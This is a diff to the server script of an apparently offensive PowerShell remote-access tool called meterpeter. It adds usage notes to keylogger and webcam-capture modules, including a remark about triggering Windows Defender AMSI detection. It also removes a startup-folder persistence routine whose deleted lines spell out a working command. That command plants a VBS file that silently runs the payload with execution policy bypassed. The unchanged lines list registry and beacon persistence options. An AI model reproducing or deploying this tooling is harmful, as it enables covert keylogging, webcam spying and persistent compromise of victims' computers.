@@ -719,6 +719,9 @@ While($Client.Connected)
     ## venom v1.0.16 function
     If($Command -eq "keylogger")
     {
+      write-host "`n   Requirements" -ForegroundColor Yellow;
+      write-host "   ------------";
+      write-host "   Client must be deploy in target %TEMP% folder.";
       ## Install Remote-Host Keylogger Function
       write-host "`n`n   Modules   Description                  Remark" -ForegroundColor green;
       write-host "   -------   -----------                  ------";
@@ -896,6 +899,10 @@ While($Client.Connected)
       }
       If($choise -eq "CamSnap" -or $choise -eq "cam")
       {
+        write-host "`n   Remark" -ForegroundColor Yellow;
+        write-host "   ------";
+        write-host "   Executing this module in UserLand (privileges) will";
+        write-host "   trigger the AntiVirus (WindowsDefender) Amsi Detection";
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
         write-host "   Device    List WebCam Devices             Client:User  - Privileges required";
@@ -964,7 +971,6 @@ While($Client.Connected)
         write-host "   Target machine needs to restart to beacon home.";
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
-        write-host "   StartUp   Persiste Client Using startup   Client:User  - Privileges required";
         write-host "   Beacon    Persiste Client using startup   Client:User  - Privileges required";
         write-host "   RUNONCE   Persiste Client using REG:Run   Client:User  - Privileges required";
         write-host "   REGRUN    Persiste Client using REG:Run   Client:User|Admin - Privs required";
@@ -973,15 +979,6 @@ While($Client.Connected)
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Persistance> " -NoNewline -ForeGroundColor Green;
         $startup_choise = Read-Host;
-        If($startup_choise -eq "StartUp" -or $startup_choise -eq "up")
-        {
-          write-host " Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
-          Write-Host "   -------                -------------------";
-          Write-Host "   Update-KB4524147.ps1   `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`n";
-          $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
-          # $Command = Variable_Obfuscation(Character_Obfuscation($Command));
-        }
         If($startup_choise -eq "Beacon" -or $startup_choise -eq "Beacon")
         {
           $BeaconTime = $Null;
